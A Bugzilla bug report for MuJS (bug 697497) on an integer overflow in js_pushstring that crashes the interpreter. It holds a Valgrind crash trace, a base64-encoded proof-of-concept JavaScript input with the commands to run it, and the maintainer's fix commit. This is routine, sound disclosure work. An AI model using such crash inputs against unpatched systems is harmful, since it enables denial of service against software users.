=== Content from bugs.ghostscript.com_d7bf1e21_20250125_135748.html ===


Bugzilla – Bug 697497
Integer Overflow and crash in 'js\_pushstring' function in jsrun.c
Last modified: 2017-01-24 06:30:50 UTC

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=697497&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=697497&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 697497**](show_bug.cgi?id=697497)
- Integer Overflow and crash in 'js\_pushstring' function in jsrun.c

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
Integer Overflow and crash in 'js\_pushstring' function in jsrun.c

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | MuJS | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=MuJS "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | general ([show other bugs](buglist.cgi?component=general&product=MuJS&bug_status=__open__)) | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | PC Windows NT | |  | | | [Importance](page.cgi?id=fields.html#importance): | P4 normal | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Tor Andersson | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2017-01-23 04:44 UTC by op7ic | | --- | --- | | Modified: | 2017-01-24 06:30 UTC ([History](show_activity.cgi?id=697497)) | | CC List: | 0 users | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Customer:](page.cgi?id=fields.html#cf_customer "A custom Free Text field in this installation of Bugzilla.") |  | | [Word Size:](page.cgi?id=fields.html#cf_wordsize "For example x86 would be 32 and x86_64 would be 64.") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=697497&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=697497&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=697497#c0)  op7ic    2017-01-23 04:44:38 UTC  ``` Howdy there is a int overflow in js_pushstring function in jsrun.c source when parsing corrupted JS input.  Version: latest from git as of 23/01/2017  Vulnerable Source file:  mujs/jsrun.c  Function: js_pushstring    Compile Flags CFLAGS += -g3 -ggdb -O0  Compile Command:  make   Valgrind shows it pretty clear:   valgrind ./mujs-clean/build/mujs PoC.js ==1340== Memcheck, a memory error detector ==1340== Copyright (C) 2002-2013, and GNU GPL'd, by Julian Seward et al. ==1340== Using Valgrind-3.10.0 and LibVEX; rerun with -h for copyright info ==1340== Command: ./mujs-clean/build/mujs PoC.js ==1340== ==1340== Invalid read of size 1 ==1340==    at 0x4C2C1A2: strlen (vg_replace_strmem.c:412) ==1340==    by 0x403E80: js_pushstring (jsrun.c:114) ==1340==    by 0x41611A: Ap_join (jsarray.c:138) ==1340==    by 0x416DA7: Ap_toString (jsarray.c:398) ==1340==    by 0x406F77: jsR_callcfunction (jsrun.c:1023) ==1340==    by 0x4072A0: js_call (jsrun.c:1065) ==1340==    by 0x409CCE: jsV_toString (jsvalue.c:56) ==1340==    by 0x409EBB: jsV_toprimitive (jsvalue.c:103) ==1340==    by 0x40A4B7: jsV_tonumber (jsvalue.c:209) ==1340==    by 0x4047B9: js_tonumber (jsrun.c:261) ==1340==    by 0x408C6F: jsR_run (jsrun.c:1484) ==1340==    by 0x406EBD: jsR_callscript (jsrun.c:1006) ==1340==  Address 0x0 is not stack'd, malloc'd or (recently) free'd ==1340== ==1340== ==1340== Process terminating with default action of signal 11 (SIGSEGV) ==1340==  Access not within mapped region at address 0x0 ==1340==    at 0x4C2C1A2: strlen (vg_replace_strmem.c:412) ==1340==    by 0x403E80: js_pushstring (jsrun.c:114) ==1340==    by 0x41611A: Ap_join (jsarray.c:138) ==1340==    by 0x416DA7: Ap_toString (jsarray.c:398) ==1340==    by 0x406F77: jsR_callcfunction (jsrun.c:1023) ==1340==    by 0x4072A0: js_call (jsrun.c:1065) ==1340==    by 0x409CCE: jsV_toString (jsvalue.c:56) ==1340==    by 0x409EBB: jsV_toprimitive (jsvalue.c:103) ==1340==    by 0x40A4B7: jsV_tonumber (jsvalue.c:209) ==1340==    by 0x4047B9: js_tonumber (jsrun.c:261) ==1340==    by 0x408C6F: jsR_run (jsrun.c:1484) ==1340==    by 0x406EBD: jsR_callscript (jsrun.c:1006) ==1340==  If you believe this happened as a result of a stack ==1340==  overflow in your program's main thread (unlikely but ==1340==  possible), you can try to increase the size of the ==1340==  main thread stack using the --main-stacksize= flag. ==1340==  The main thread stack size used in this run was [8388608](http://www.ghostscript.com/cgi-bin/findgit.cgi?8388608). ==1340== ==1340== HEAP SUMMARY: ==1340==     in use at exit: 129,584 bytes in 1,269 blocks ==1340==   total heap usage: 1,343 allocs, 74 frees, 136,545 bytes allocated ==1340== ==1340== LEAK SUMMARY: ==1340==    definitely lost: 0 bytes in 0 blocks ==1340==    indirectly lost: 0 bytes in 0 blocks ==1340==      possibly lost: 0 bytes in 0 blocks ==1340==    still reachable: 129,584 bytes in 1,269 blocks ==1340==         suppressed: 0 bytes in 0 blocks ==1340== Rerun with --leak-check=full to see details of leaked memory ==1340== ==1340== For counts of detected and suppressed errors, rerun with: -v ==1340== ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 0 from 0) Segmentation fault    PoC (base64 encoded): KyBBcnJheSggbnVsbC00KQ==   PoC execution:  base64 -d /tmp/b64PoC.poc > /tmp/proof.js valgrind ./mujs-clean/build/mujs /tmp/proof.js ```  [Comment 1](show_bug.cgi?id=697497#c1)  Tor Andersson    2017-01-24 06:30:50 UTC  ``` Fixed in commit [4006739a28367c708dea19aeb19b8a1a9326ce08](http://www.ghostscript.com/cgi-bin/findgit.cgi?4006739a28367c708dea19aeb19b8a1a9326ce08) Author: Tor Andersson <tor.andersson@gmail.com> Date:   Tue Jan 24 14:42:36 2017 +0100      Fix 697497: Ensure array length is positive.          As a side effect when changing to using regular integers (and avoid the     nightmare of mixing signed and unsigned) we accidentally allowed negative     array lengths. ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=697497)
* - [XML](show_bug.cgi?ctype=xml&id=697497)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=697497)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=697497&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=697497&GoAheadAndLogIn=1#forgot)
    Login:

    [x]


